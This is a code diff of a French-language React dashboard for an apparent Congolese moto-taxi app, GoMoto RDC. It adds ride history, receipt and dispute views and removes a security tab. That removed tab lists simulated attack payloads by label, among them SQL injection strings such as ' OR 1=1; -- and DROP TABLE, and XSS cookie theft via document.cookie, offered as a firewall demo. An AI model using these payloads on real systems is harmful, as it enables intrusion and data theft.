+                          <p className="text-xs text-slate-500 font-medium">Aucune course trouvée.</p>
+                          <p className="text-[10px] text-slate-400 mt-1">Ajustez vos filtres ou termes de recherche.</p>
+                        </div>
+                      ) : (
+                        filteredRides.map((ride) => {
+                          const isSelected = selectedHistoryRide === ride.id;
+                          return (
+                            <button
+                              key={ride.id}
+                              type="button"
+                              onClick={() => setSelectedHistoryRide(ride.id)}
+                              className={`w-full text-left p-4 rounded-2xl border transition-all cursor-pointer flex flex-col gap-2.5 ${
+                                isSelected
+                                  ? "bg-slate-50 border-blue-500 ring-1 ring-blue-500"
+                                  : "bg-white border-slate-200 hover:border-slate-300"
+                              }`}
+                            >
+                              <div className="flex justify-between items-start w-full">
+                                <span className="text-[9px] font-bold text-slate-400 font-mono uppercase tracking-wider bg-slate-100 px-2 py-0.5 rounded">
+                                  {ride.id}
+                                </span>
+                                <span className="text-[9px] font-mono text-slate-500">
+                                  {ride.timestamp}
+                                </span>
+                              </div>
+
+                              <div className="space-y-1.5">
+                                <div className="flex gap-2 items-center text-xs font-semibold text-slate-850">
+                                  <span className="h-2 w-2 rounded-full bg-emerald-500 flex-shrink-0" />
+                                  <span className="truncate">{ride.pickupAddress.avenue}</span>
+                                </div>
+                                <div className="flex gap-2 items-center text-xs font-semibold text-slate-850">
+                                  <span className="h-2 w-2 rounded-full bg-blue-600 flex-shrink-0" />
+                                  <span className="truncate">{ride.dropoffAddress.avenue}</span>
+                                </div>
+                              </div>
+
+                              <div className="flex justify-between items-center w-full pt-2 border-t border-slate-100 mt-1 text-[11px]">
+                                <span className="text-slate-500 font-medium">{ride.driverName || "Chauffeur GoMoto"}</span>
+                                <span className="font-mono font-extrabold text-blue-700">
+                                  {ride.priceCDF.toLocaleString("fr-FR")} CDF
+                                </span>
+                              </div>
+                            </button>
+                          );
+                        })
+                      )}
+                    </div>
+
+                    {/* Detail portion - Col span 7 */}
+                    <div className="lg:col-span-12 xl:col-span-7">
+                      {(() => {
+                        const ride = filteredRides.find(r => r.id === selectedHistoryRide) || filteredRides[0] || completedRides[0];
+                        if (!ride) return null;
+
+                        return (
+                          <div className="bg-slate-50/60 rounded-2xl p-5 border border-slate-200 space-y-4">
+                            <div className="flex justify-between items-start border-b border-slate-200 pb-3">
+                              <div>
+                                <span className="text-[10px] font-mono text-slate-400 uppercase tracking-widest block">Rapport de course</span>
+                                <h4 className="text-xs font-black text-slate-800 uppercase mt-0.5 font-mono">{ride.id}</h4>
+                              </div>
+                              <div className="text-right">
+                                <span className="bg-emerald-100 text-emerald-800 border border-emerald-200 text-[9px] font-extrabold px-2 py-1 rounded">
+                                  COURSE EFFECTUÉE
+                                </span>
+                              </div>
                             </div>
-                          </div>
-                          
-                          {ride.disputeStatus === "refunded" ? (
-                            <div className="bg-emerald-100/95 text-emerald-800 border border-emerald-200 py-2 px-4 rounded-xl text-[10.5px] font-black text-center uppercase tracking-wider flex items-center justify-center gap-1.5 font-mono">
-                              ✓ Litige Réglé : Course entièrement remboursée sur votre Wallet !
+
+                            {/* Start & End locations lists */}
+                            <div className="space-y-3.5 bg-white p-4 rounded-xl border border-slate-150">
+                              <div className="flex gap-3 text-xs">
+                                <div className="flex flex-col items-center">
+                                  <span className="h-3 w-3 rounded-full bg-emerald-500 flex items-center justify-center border-2 border-white ring-2 ring-emerald-100 flex-shrink-0" />
+                                  <div className="w-0.5 h-8 bg-slate-200" />
+                                  <span className="h-3 w-3 rounded-full bg-blue-600 flex items-center justify-center border-2 border-white ring-2 ring-blue-100 flex-shrink-0" />
+                                </div>
+                                <div className="space-y-4 flex-1">
+                                  <div className="space-y-0.5">
+                                    <span className="text-[8px] font-black text-slate-400 uppercase tracking-wider block">Départ</span>
+                                    <span className="font-bold text-slate-800 text-[11px]">
+                                      {ride.pickupAddress.avenue}, Q.{ride.pickupAddress.quartier} ({ride.pickupAddress.commune})
+                                    </span>
+                                  </div>
+                                  <div className="space-y-0.5">
+                                    <span className="text-[8px] font-black text-slate-400 uppercase tracking-wider block">Destination</span>
+                                    <span className="font-bold text-slate-800 text-[11px]">
+                                      {ride.dropoffAddress.avenue}, Q.{ride.dropoffAddress.quartier} ({ride.dropoffAddress.commune})
+                                    </span>
+                                  </div>
+                                </div>
+                              </div>
                             </div>
-                          ) : (
-                            <div className="flex flex-wrap gap-2 pt-1 justify-end">
+
+                            {/* Static mapping system */}
+                            <div className="relative h-44 bg-slate-100 rounded-2xl border border-slate-200 overflow-hidden shadow-inner">
+                              {/* Grid road layout vector simulation lines */}
+                              <svg className="absolute inset-0 w-full h-full text-slate-200" xmlns="http://www.w3.org/2000/svg">
+                                <defs>
+                                  <pattern id="grid-map-y" width="30" height="30" patternUnits="userSpaceOnUse">
+                                    <path d="M 30 0 L 0 0 0 30" fill="none" stroke="currentColor" strokeWidth="0.5" />
+                                  </pattern>
+                                </defs>
+                                <rect width="100%" height="100%" fill="url(#grid-map-y)" />
+                                <line x1="0" y1="40" x2="100%" y2="40" stroke="#cbd5e1" strokeWidth="5" />
+                                <line x1="0" y1="120" x2="100%" y2="120" stroke="#cbd5e1" strokeWidth="5" />
+                                <line x1="80" y1="0" x2="80" y2="100%" stroke="#cbd5e1" strokeWidth="5" />
+                                <line x1="220" y1="0" x2="220" y2="100%" stroke="#cbd5e1" strokeWidth="5" />
+                                <path d="M 80 120 Q 150 80 220 40" fill="none" stroke="#3b82f6" strokeWidth="3" strokeDasharray="6,4" />
+                              </svg>
+
+                              <div className="absolute bottom-[28px] left-[66px] flex flex-col items-center">
+                                <span className="bg-emerald-600 text-white rounded-full p-1 text-[8.5px] font-black z-10 flex items-center justify-center shadow-lg w-5 h-5 leading-none">A</span>
+                                <span className="bg-slate-900/90 text-white font-bold text-[7.5px] px-1 py-0.5 rounded border border-slate-800 whitespace-nowrap mt-1 font-sans">{ride.pickupAddress.commune}</span>
+                              </div>
+
+                              <div className="absolute top-[20px] left-[200px] flex flex-col items-center">
+                                <span className="bg-blue-650 text-white rounded-full p-1 text-[8.5px] font-black z-10 flex items-center justify-center shadow-lg w-5 h-5 leading-none">B</span>
+                                <span className="bg-slate-900/90 text-white font-bold text-[7.5px] px-1 py-0.5 rounded border border-slate-800 whitespace-nowrap mt-1 font-sans">{ride.dropoffAddress.commune}</span>
+                              </div>
+
+                              <div className="absolute top-2.5 right-2 text-right">
+                                <span className="bg-slate-900/70 backdrop-blur-xs text-white font-mono text-[8px] px-1.5 py-0.5 rounded-lg border border-slate-700 font-bold block">
+                                  COMMUNE: {ride.pickupAddress.commune} vers {ride.dropoffAddress.commune}
+                                </span>
+                              </div>
+
+                              <div className="absolute bottom-2.5 right-2 text-right">
+                                <span className="bg-slate-900 text-yellow-400 font-mono text-[8.5px] font-extrabold px-2 py-0.5 rounded-lg border border-slate-800 shadow-md">
+                                  Distance: {ride.distanceKm} km
+                                </span>
+                              </div>
+                            </div>
+
+                            {/* Invoice & Driver details bento row */}
+                            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-left">
+                              <div className="bg-white p-4 rounded-xl border border-slate-150 flex flex-col justify-between">
+                                <div className="space-y-0.5 text-[10px]">
+                                  <span className="text-[8px] font-black text-slate-400 uppercase tracking-widest block font-sans">Chauffeur Assigné</span>
+                                  <p className="font-extrabold text-slate-850 mt-1">{ride.driverName || "Ir. Héritier LUKUSA"}</p>
+                                  <p className="text-slate-500 mt-0.5 font-mono">{ride.driverPhone || "+243 899 123 456"}</p>
+                                </div>
+                                <div className="mt-3 bg-slate-50 p-2 rounded-lg text-[9px] text-slate-500 font-medium leading-relaxed font-sans">
+                                  Le motard a été authentifié via reconnaissance faciale avant de démarrer ce trajet.
+                                </div>
+                              </div>
+
+                              <div className="bg-white p-4 rounded-xl border border-slate-150 text-xs flex flex-col justify-between">
+                                <span className="text-[8px] font-black text-slate-400 uppercase tracking-widest block mb-2 font-sans">Facturation vérifiée</span>
+                                <div className="space-y-1.5">
+                                  <div className="flex justify-between items-center text-slate-600 font-medium">
+                                    <span>Prix de base :</span>
+                                    <span className="font-mono">{ride.priceCDF.toLocaleString("fr-FR")} CDF</span>
+                                  </div>
+                                  <div className="flex justify-between items-center text-slate-600 font-medium">
+                                    <span>Conversion USD :</span>
+                                    <span className="font-mono">${ride.priceUSD.toFixed(2)} USD</span>
+                                  </div>
+                                  <div className="flex justify-between items-center font-extrabold text-slate-850 border-t border-slate-100 pt-1.5">
+                                    <span>Total Payé :</span>
+                                    <span className="font-mono text-emerald-700">{ride.priceCDF.toLocaleString("fr-FR")} CDF</span>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+
+                            {/* Download Receipts & Revenues Row */}
+                            <div id={`history-ride-actions-row-${ride.id}`} className="bg-slate-50 border border-slate-200 p-4.5 rounded-2xl flex flex-col sm:flex-row gap-3.5 items-center justify-between text-left animate-fade-in shadow-sm">
+                              <div className="space-y-0.5 max-w-md">
+                                <span className="text-xs font-bold text-slate-800 flex items-center gap-1.5 font-sans">
+                                  <span className="w-1.5 h-1.5 rounded-full bg-blue-600"></span>
+                                  <span>Reçu de Ventilation des Revenus (Syndicat RDC)</span>
+                                </span>
+                                <span className="text-[10px] text-slate-500 block leading-relaxed font-sans">
+                                  Télécharger le relevé de répartition GoMoto RDC avec répartition transparente : <b>70% Chauffeur</b> ({ride.driverName || "Héritier"}), <b>15% Propriétaire de Flotte</b> (Dieudonné) et <b>15% GoMoto</b>.
+                                </span>
+                              </div>
+                              
                               <button
                                 type="button"
-                                onClick={() => {
-                                  setArbitrageRideId(ride.id);
-                                  setArbitrageReason("course_non_effectuee");
-                                  setArbitrageDetails(`Signalement d'absence de prise en charge pour la course ${ride.id} datant du ${ride.timestamp}.`);
-                                  setActiveTab("disputes");
-                                }}
-                                className="bg-red-650 hover:bg-red-750 text-white font-extrabold text-[9.5px] tracking-wider uppercase py-2 px-3.5 rounded-lg border border-red-700 font-mono transition-all flex items-center gap-1 cursor-pointer hover:shadow-xs"
+                                id={`btn-download-revenue-receipt-${ride.id}`}
+                                onClick={() => handleDownloadRevenueReceipt(ride)}
+                                className="w-full sm:w-auto bg-blue-600 hover:bg-blue-700 text-white font-extrabold text-[11.5px] px-4 py-2.5 rounded-xl transition-all flex items-center justify-center gap-2 cursor-pointer shadow-sm hover:translate-x-0.5 active:scale-95"
                               >
-                                Signaler Non Effectuée & Rembourser via Wallet
+                                <Download className="w-3.5 h-3.5 text-white flex-shrink-0" />
+                                <span>Télécharger le PDF</span>
                               </button>
                             </div>
-                          )}
-                        </div>
-                      </div>
-                    );
-                  })()}
-                </div>
 
-              </div>
-            )}
+                            {/* Dispute Center Box */}
+                            <div className="bg-red-50/50 border border-red-100 rounded-2xl p-4.5 space-y-3 text-left">
+                              <div className="flex items-start gap-2.5">
+                                <span className="text-base select-none mt-0.5">⚠️</span>
+                                <div>
+                                  <span className="font-extrabold text-red-950 text-xs block">Un problème avec ce trajet ?</span>
+                                  <span className="text-[10px] text-red-805 block mt-1 leading-relaxed">
+                                    Si cette course n'a pas été réellement effectuée ou si le motard GoMoto ne s'est jamais présenté, vous pouvez lancer immédiatement le protocole de conciliation d'État REPARO. L'arbitrage est instantané d'après la télémétrie GPS et déclenchera votre remboursement direct vers le portefeuille mobile (Wallet).
+                                  </span>
+                                </div>
+                              </div>
+                              
+                              {ride.disputeStatus === "refunded" ? (
+                                <div className="bg-emerald-100/95 text-emerald-800 border border-emerald-200 py-2 px-4 rounded-xl text-[10.5px] font-black text-center uppercase tracking-wider flex items-center justify-center gap-1.5 font-mono">
+                                  ✓ Litige Réglé : Course entièrement remboursée sur votre Wallet !
+                                </div>
+                              ) : (
+                                <div className="flex flex-wrap gap-2 pt-1 justify-end">
+                                  <button
+                                    type="button"
+                                    onClick={() => {
+                                      setArbitrageRideId(ride.id);
+                                      setArbitrageReason("course_non_effectuee");
+                                      setArbitrageDetails(`Signalement d'absence de prise en charge pour la course ${ride.id} datant du ${ride.timestamp}.`);
+                                      setActiveTab("disputes");
+                                    }}
+                                    className="bg-red-650 hover:bg-red-750 text-white font-extrabold text-[9.5px] tracking-wider uppercase py-2 px-3.5 rounded-lg border border-red-700 font-mono transition-all flex items-center gap-1 cursor-pointer hover:shadow-xs"
+                                  >
+                                    Signaler Non Effectuée & Rembourser via Wallet
+                                  </button>
+                                </div>
+                              )}
+                            </div>
+                          </div>
+                        );
+                      })()}
+                    </div>
+                  </div>
+                </div>
+              );
+            })()}
           </div>
         )}
 
@@ -4101,344 +4742,30 @@ export default function ClientDashboard({
           </div>
         )}
 
-        {/* ================= TABS VIEW 4: SECURITY & ANTI-HACKING SHIELD ================= */}
-        {activeTab === "security" && (
-          <div className="bg-white border border-slate-200 rounded-3xl p-6 shadow-sm space-y-6">
-            <div className="flex justify-between items-start gap-4 flex-wrap">
-              <div>
-                <h3 className="font-bold text-slate-900 text-sm flex items-center gap-2">
-                  <ShieldCheck className="w-5 h-5 text-red-650" />
-                  <span>Bouclier Cyber-Sécurité & Anti-Piratage GoMoto RDC</span>
-                </h3>
-                <p className="text-[10px] text-slate-500 mt-0.5">Système actif de détection des intrusions et de protection contre les utilisateurs malveillants</p>
-              </div>
-              <span className={`px-3 py-1 rounded-xl text-[9.5px] font-bold uppercase tracking-wider border flex items-center gap-1.5 shadow-sm ${
-                integrityStatus === "secure" ? "bg-emerald-50 text-emerald-700 border-emerald-200 animate-pulse" :
-                integrityStatus === "checking" ? "bg-blue-50 text-blue-700 border-blue-200" : "bg-red-50 text-red-700 border-red-200"
-              }`}>
-                <span className={`h-2 w-2 rounded-full ${
-                  integrityStatus === "secure" ? "bg-emerald-500" :
-                  integrityStatus === "checking" ? "bg-blue-500 animate-ping" : "bg-red-500"
-                }`}></span>
-                <span>{
-                  integrityStatus === "secure" ? "SYSTÈME SAIN (WAF ACTIF)" :
-                  integrityStatus === "checking" ? "ANALYSE D'INTÉGRITÉ EN COURS..." : "ALERTE INTITULÉS SUSPECTS DETECTÉS"
-                }</span>
-              </span>
-            </div>
-
-            {/* Shield info card */}
-            <div className="bg-slate-950 p-5 rounded-2xl text-slate-200 space-y-4 shadow-inner relative overflow-hidden">
-              <div className="absolute top-0 right-0 p-8 opacity-5">
-                <Shield className="w-48 h-48 text-white" />
-              </div>
-              <div className="flex items-start gap-3.5 relative z-10">
-                <div className="bg-red-650/15 border border-red-550/20 p-2.5 rounded-xl">
-                  <Server className="w-6 h-6 text-red-505 animate-pulse" />
-                </div>
-                <div>
-                  <h4 className="text-xs font-bold uppercase tracking-widest text-slate-300">Pare-feu Applicatif GoMoto (WAF)</h4>
-                  <p className="text-slate-405 text-[10.5px] leading-relaxed mt-1">
-                    Notre moteur cyber-défensif d'État scrute en temps réel chaque interaction (portefeuille, critiques, messageries). 
-                    Grâce à un système d'analyse heuristique, il neutralise instantanément les injections SQL, XSS, requêtes DDoS et modders d'APK.
-                  </p>
-                </div>
-              </div>
-
-              <div className="grid grid-cols-1 md:grid-cols-3 gap-3 pt-2 text-[10.5px] relative z-10">
-                <div className="bg-slate-900 border border-slate-800 p-3 rounded-xl flex items-center gap-2.5">
-                  <Lock className="w-4 h-4 text-emerald-500 flex-shrink-0" />
-                  <div>
-                    <span className="font-bold block text-slate-300">Sanitizer XSS</span>
-                    <span className="text-slate-500 text-[9.5px]">Échappement DOM automatique</span>
-                  </div>
-                </div>
-                <div className="bg-slate-900 border border-slate-800 p-3 rounded-xl flex items-center gap-2.5">
-                  <ShieldAlert className="w-4 h-4 text-red-550 flex-shrink-0" />
-                  <div>
-                    <span className="font-bold block text-slate-300">Anti-SQL Injection</span>
-                    <span className="text-slate-500 text-[9.5px]">Validation regex des requêtes</span>
-                  </div>
-                </div>
-                <div className="bg-slate-900 border border-slate-800 p-3 rounded-xl flex items-center gap-2.5">
-                  <Activity className="w-4 h-4 text-blue-500 flex-shrink-0" />
-                  <div>
-                    <span className="font-bold block text-slate-300">Rate Limiter</span>
-                    <span className="text-slate-500 text-[9.5px]">Max 10 req/min (Anti-Flood)</span>
-                  </div>
-                </div>
-              </div>
-            </div>
-
-            {/* Penetration Testing Playground is incredibly fun! */}
-            <div className="bg-red-50 border border-red-200 p-5 rounded-2xl space-y-4">
-              <div className="flex items-center gap-2.5">
-                <AlertTriangle className="w-5 h-5 text-red-650 flex-shrink-0" />
-                <div>
-                  <h4 className="text-xs font-bold text-slate-900 uppercase tracking-wider">Simulateur de Pénétration Clinique (Zone de Test)</h4>
-                  <p className="text-[10px] text-slate-500 mt-0.5">Testez notre système de pare-feu en envoyant des payloads corrompus conçus par des hackers</p>
-                </div>
-              </div>
-
-              <div className="flex gap-2 items-center flex-wrap">
-                <div className="flex-1 min-w-[200px]">
-                  <select
-                    value={selectedSimulatedAttack}
-                    onChange={(e) => setSelectedSimulatedAttack(e.target.value)}
-                    className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs font-bold focus:border-red-650 outline-none text-slate-800"
-                  >
-                    <option value="sqli_bypass">SQLi : Contourner l'authentification (' OR 1=1; --)</option>
-                    <option value="sqli_ddl">SQLi : Détruire les tables (DROP TABLE Transactions)</option>
-                    <option value="xss_cookie_steal">XSS : Voler les cookies de session (document.cookie)</option>
-                    <option value="xss_img_onerror">XSS : Injection d'alertes distantes (img onerror)</option>
-                    <option value="parameter_negative_recharge">Falsification : Injecter solde négatif (-500 000 CDF)</option>
-                    <option value="brute_force_flood">DDoS : Envoyer de fausses requêtes (Flood)</option>
-                  </select>
-                </div>
-
-                <div className="flex gap-2 flex-shrink-0">
-                  <button
-                    type="button"
-                    onClick={handleExecuteSimulatedAttack}
-                    className="bg-red-600 hover:bg-red-700 text-white font-bold py-2.5 px-4.5 rounded-xl text-xs transition-all cursor-pointer flex items-center gap-1.5 shadow"
-                  >
-                    <ShieldAlert className="w-4 h-4" />
-                    <span>Lancer l'Attaque</span>
-                  </button>
-                  <button
-                    type="button"
-                    onClick={handleTriggerIntegrityCheck}
-                    disabled={isIntegrityChecking}
-                    className="bg-slate-200 hover:bg-slate-300 text-slate-700 font-bold py-2.5 px-4.5 rounded-xl text-xs transition-all cursor-pointer flex items-center gap-1.5 disabled:opacity-50"
-                  >
-                    <RotateCcw className={`w-4 h-4 ${isIntegrityChecking ? 'animate-spin' : ''}`} />
-                    <span>{isIntegrityChecking ? "Analyse..." : "Scanner Intégrité"}</span>
-                  </button>
-                </div>
-              </div>
-
-              {ipBanCountdown > 0 && (
-                <div className="bg-amber-50 border border-amber-200 p-3 rounded-lg text-amber-800 text-[10.5px] font-bold animate-pulse flex items-center gap-2">
-                  <ShieldAlert className="w-4 h-4 text-amber-600" />
-                  <span>ALERTE DDOS : Attaque par inondation de requêtes détectée. Blocage IP actif, temps restant de mise en quarantaine: {ipBanCountdown}s</span>
-                </div>
-              )}
-            </div>
-
-            {/* Audit Logs Table */}
-            <div className="border border-slate-200 rounded-2xl overflow-hidden bg-slate-50">
-              <div className="p-4 bg-white border-b border-slate-200 flex justify-between items-center flex-wrap gap-2">
-                <span className="text-xs font-bold text-slate-800 flex items-center gap-2">
-                  <FileText className="w-4 h-4 text-slate-500" />
-                  <span>Journal de Securité & Historique des Attaques</span>
-                </span>
-                <button
-                  type="button"
-                  onClick={() => {
-                    setSecurityEvents([]);
-                    localStorage.setItem(`gomoto_security_events_${profile.id}`, JSON.stringify([]));
-                  }}
-                  className="text-slate-400 hover:text-red-655 transition-all text-[9.5px] uppercase font-bold tracking-widest cursor-pointer"
-                >
-                  Vider l'historique
-                </button>
-              </div>
-
-              <div className="divide-y divide-slate-100 overflow-x-auto max-h-[300px]">
-                {securityEvents.length > 0 ? (
-                  securityEvents.map((evt) => (
-                    <div key={evt.id} className="p-4 bg-white hover:bg-slate-50 transition-all space-y-2">
-                      <div className="flex justify-between items-start gap-2">
-                        <div className="space-y-0.5">
-                          <div className="flex items-center gap-2 flex-wrap">
-                            <span className="font-bold text-xs text-slate-800">{evt.threatType}</span>
-                            <span className={`px-1.5 py-0.5 rounded text-[8px] font-extrabold uppercase ${
-                              evt.riskScore === "CRITICAL" ? "bg-red-105 text-red-750 border border-red-200" :
-                              evt.riskScore === "HIGH" ? "bg-amber-100 text-amber-750 border border-amber-200" : "bg-blue-100 text-blue-755 border"
-                            }`}>
-                              Niveau {evt.riskScore}
-                            </span>
-                          </div>
-                          <p className="text-[10px] text-slate-400 font-mono">ID: {evt.id} • At: {evt.timestamp}</p>
-                        </div>
-                        <span className="bg-red-50 text-red-700 font-extrabold px-2 py-0.5 rounded text-[9px] uppercase border border-red-105 flex-shrink-0">
-                          {evt.actionTaken}
-                        </span>
-                      </div>
-
-                      <div className="bg-slate-50 p-2.5 rounded-lg border border-slate-150 space-y-1">
-                        <p className="text-[10.5px] leading-relaxed text-slate-705">{evt.details}</p>
-                        <div className="flex items-center gap-2 text-[9.5px] font-mono text-slate-500 pt-1 border-t border-slate-100">
-                          <span className="font-bold text-slate-805">IP Source :</span> <span>{evt.sourceIp}</span>
-                        </div>
-                        <div className="flex items-center gap-2 text-[9.5px] font-mono text-slate-500 mt-0.5">
-                          <span className="font-bold text-slate-850">Payload Bloqué :</span> <span className="bg-red-50 text-red-600 px-1 py-0.5 rounded select-all break-all font-bold">{evt.rawInput}</span>
-                        </div>
-                      </div>
-                    </div>
-                  ))
-                ) : (
-                  <div className="p-8 text-center text-xs text-slate-400 font-medium">
-                    Aucune tentative d'intrusion signalée ces dernières 24 heures. Plateforme GoMoto RDC Intègre.
-                  </div>
-                )}
-              </div>
-            </div>
-
-            {/* Detailed Recommendations & Future Proof Security Roadmap */}
-            <div className="border border-slate-200 rounded-3xl p-5 bg-blue-50/40 space-y-4">
-              <h4 className="text-xs font-bold text-slate-900 uppercase tracking-widest flex items-center gap-1.5">
-                <Key className="w-4 h-4 text-blue-600 animate-pulse" />
-                <span>Recommandations d'Architecture Cybersécurité pour GoMoto</span>
-              </h4>
-              <p className="text-[11px] text-slate-650 leading-relaxed">
-                Afin de maintenir une robustesse d'État contre les pirates informatiques sur l'environnement de production en RDC, voici nos recommandations de sécurité physique et applicative les plus fiables et sûres :
-              </p>
-
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-[11px] pt-1 leading-relaxed">
-                <div className="space-y-1 bg-white p-3.5 rounded-xl border border-slate-200 shadow-sm">
-                  <span className="font-extrabold text-blue-850 block">1. Authentification Double-Facteur (2FA OTP) :</span>
-                  <span className="text-slate-650 block">
-                    Tout retrait, rechargement d'envergure, ou modification d'informations de profil critique doit lever une validation par jeton éphémère (OTP) par SMS de l'opérateur (Airtel, Vodacom, Orange) pour contrer le détournement de session.
-                  </span>
-                </div>
-                <div className="space-y-1 bg-white p-3.5 rounded-xl border border-slate-200 shadow-sm">
-                  <span className="font-extrabold text-blue-850 block">2. Attestation d'Intégrité de l'Application (Device Integrity) :</span>
-                  <span className="text-slate-655 block">
-                    Déploiement de Play Integrity (Android) ou DeviceCheck (iOS) pour s'assurer que l'application GoMoto n'a pas été modifiée ou patchée par reverse-engineering, et que l'utilisateur n'opère pas avec des faux GPS (GPS spoofing).
-                  </span>
-                </div>
-                <div className="space-y-1 bg-white p-3.5 rounded-xl border border-slate-200 shadow-sm">
-                  <span className="font-extrabold text-blue-850 block">3. Cryptographie de Session & Épingle de Certificat (Cert Pinning) :</span>
-                  <span className="text-slate-655 block">
-                    Mise en œuvre du Certificate Pinning SSL pour interdire toute interception de données par Proxy (ex: Man-in-the-Middle) et chiffrement de la mémoire cache locale protégeant les clés sécurisées et soldes des motards.
-                  </span>
-                </div>
-                <div className="space-y-1 bg-white p-3.5 rounded-xl border border-slate-205 shadow-sm">
-                  <span className="font-extrabold text-blue-850 block">4. Programme National de Bug Bounty :</span>
-                  <span className="text-slate-655 block">
-                    Établir un cadre de divulgation responsable éthique, invitant les chercheurs en cybersécurité congolais et internationaux à tester d'éventuelles failles de GoMoto en échange de récompenses transparentes.
-                  </span>
-                </div>
-              </div>
-            </div>
-
-            {/* Network Resilience & Embedded IndexedDB Cache dashboard */}
-            <div className="border border-slate-200 rounded-3xl p-5 bg-emerald-50/50 space-y-4">
-              <div className="flex justify-between items-start gap-4 flex-wrap">
-                <div>
-                  <h4 className="text-xs font-bold text-slate-900 uppercase tracking-widest flex items-center gap-1.5 font-sans">
-                    <Database className="w-4 h-4 text-emerald-600" />
-                    <span>Réseau Congolais GSM & Persistance IndexedDB d'État</span>
-                  </h4>
-                  <p className="text-[10px] text-slate-500 mt-0.5 font-sans">
-                    Contrecarrez l'évanescence de la connectivité réseau en RDC avec notre moteur asynchrone stock-and-forward.
-                  </p>
-                </div>
-
-                <div className="flex gap-2 text-[9px] font-bold font-mono">
-                  <span className={`px-2 py-0.5 rounded-lg border flex items-center gap-1.5 ${
-                    isOnline && !offlineModeSimulated 
-                      ? "bg-emerald-50 text-emerald-705 border-emerald-200" 
-                      : "bg-amber-50 text-amber-705 border-amber-200"
-                  }`}>
-                    <span className={`h-1.5 w-1.5 rounded-full ${
-                      isOnline && !offlineModeSimulated ? "bg-emerald-500" : "bg-amber-500 animate-ping"
-                    }`}></span>
-                    <span>{isOnline && !offlineModeSimulated ? "CONNEXION EN LIGNE" : "GSM INSTABLE - HORS LIGNE"}</span>
-                  </span>
-                </div>
-              </div>
-
-              {/* Offline mode explanation */}
-              <p className="text-[11px] text-slate-650 leading-relaxed font-sans">
-                Afin de se conformer au cahier des charges des syndicats de motards à Kinshasa et d'assurer une disponibilité à 100%, GoMoto intègre un cache répliqué complet de l'historique des courses et du solde de portefeuille. Pour tester la robustesse du système applicatif, vous pouvez simuler une panne réseau mobile en basculant l'interrupteur ci-dessous.
-              </p>
-
-              {/* Interactive controller card */}
-              <div className="bg-white border border-slate-200 rounded-2xl p-4.5 space-y-4 shadow-xs text-left">
-                <div className="flex items-center justify-between gap-4 flex-wrap">
-                  <div className="space-y-0.5">
-                    <span className="text-xs font-bold text-slate-800 block">Simulateur de Panne GSM (RDC Offline Mode)</span>
-                    <span className="text-[10px] text-slate-500 block leading-tight font-sans">
-                      Désactiver virtuellement la couche réseau pour tester l'historique et le portefeuille en mode offline.
-                    </span>
-                  </div>
-
-                  {/* Switch */}
-                  <button
-                    type="button"
-                    onClick={() => {
-                      const newSim = !offlineModeSimulated;
-                      setOfflineModeSimulated(newSim);
-                      if (newSim) {
-                        showToast("warning", "Simulation Hors-ligne", "L'application GoMoto simule désormais une coupure réseau totale. Les données proviennent exclusivement d'IndexedDB.");
-                      } else {
-                        showToast("success", "Simulation En-ligne", "Connexion réseau rétablie virtuellement. Données synchronisées.");
-                      }
-                    }}
-                    className={`w-12 h-6.5 rounded-full p-0.5 transition-all outline-none duration-300 flex items-center cursor-pointer ${
-                      offlineModeSimulated ? "bg-amber-500 justify-end" : "bg-slate-300 justify-start"
-                    }`}
-                  >
-                    <span className="bg-white w-5.5 h-5.5 rounded-full shadow-md block transition-all" />
-                  </button>
-                </div>
-
-                {/* Sub-actions buttons */}
-                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5 pt-1.5">
-                  <button
-                    type="button"
-                    onClick={async () => {
-                      try {
-                        const now = new Date();
-                        // Explicitly sync to IndexedDB
-                        await cacheWalletBalance(profile.walletBalanceCDF, profile.walletBalanceUSD, profile.id);
-                        await cacheRidesHistory(completedRides, profile.id);
-                        setLastCacheSyncString(now.toLocaleTimeString("fr-FR") + " " + now.toLocaleDateString("fr-FR"));
-                        showToast("success", "Cache d'État Synchronisé", "L'IndexedDB GoMotoRDC_OfflineStorage a été mise à jour avec les états courants.");
-                      } catch (err) {
-                        showToast("error", "Échec de Synchronisation", "Erreur lors de l'accès au pilote IndexedDB local.");
-                      }
-                    }}
-                    className="bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2.5 px-4 rounded-xl text-[10.5px] transition-all flex items-center justify-center gap-1.5 shadow-xs cursor-pointer select-none"
-                  >
-                    <RefreshCw className="w-3.5 h-3.5" />
-                    <span>Forcer Sync IndexedDB</span>
-                  </button>
-
-                  <button
-                    type="button"
-                    onClick={() => {
-                      // Clear Local fallback to show it's reacting
-                      localStorage.removeItem(`gomoto_offline_wallet_${profile.id}`);
-                      localStorage.removeItem(`gomoto_offline_rides_${profile.id}`);
-                      setLastCacheSyncString("");
-                      showToast("info", "Cache IndexedDB Réinitialisé", "La persistance locale d'État GoMotoRDC_OfflineStorage a été purgée avec succès.");
-                    }}
-                    className="bg-slate-150 hover:bg-slate-200 text-slate-700 font-bold py-2.5 px-4 rounded-xl text-[10.5px] transition-all flex items-center justify-center gap-1.5 cursor-pointer border border-slate-200 select-none"
-                  >
-                    <RotateCcw className="w-3.5 h-3.5" />
-                    <span>Vider le Cache Local</span>
-                  </button>
-                </div>
-              </div>
-
-              {/* Telemetry info */}
-              <div className="bg-slate-900 text-slate-300 p-3.5 rounded-xl border border-slate-950 font-mono text-[9px] flex flex-col gap-1 text-left leading-normal">
-                <div className="flex items-center gap-1.5 text-emerald-450 font-bold border-b border-slate-850 pb-1.5 mb-1.5">
-                  <Database className="w-3.5 h-3.5" />
-                  <span>METADONNÉES DE FLUX INDEXEDDB (TELÉMÉTRIE D'ÉTAT LOGS)</span>
-                </div>
-                <div><b>Région de Service :</b> Kinshasa, Bandal / Kalamu / Gombe / Limete (Rép. Dém. du Congo)</div>
-                <div><b>Pilote IndexedDB :</b> window.indexedDB (Local Storage Fallback : ACTIF)</div>
-                <div><b>Nom du Cache :</b> GoMotoRDC_OfflineStorage</div>
-                <div><b>Dernière Écriture Confirmée :</b> {lastCacheSyncString || "Non synchronisé (veuillez forcer la sync)"}</div>
-                <div><b>Taille de Segment d'Historique :</b> {completedRides.length} courses indexées</div>
-                <div><b>Statut de Chiffrement de Session :</b> Protégé par Clefs de session d'état GoMoto SAS</div>
-              </div>
-            </div>
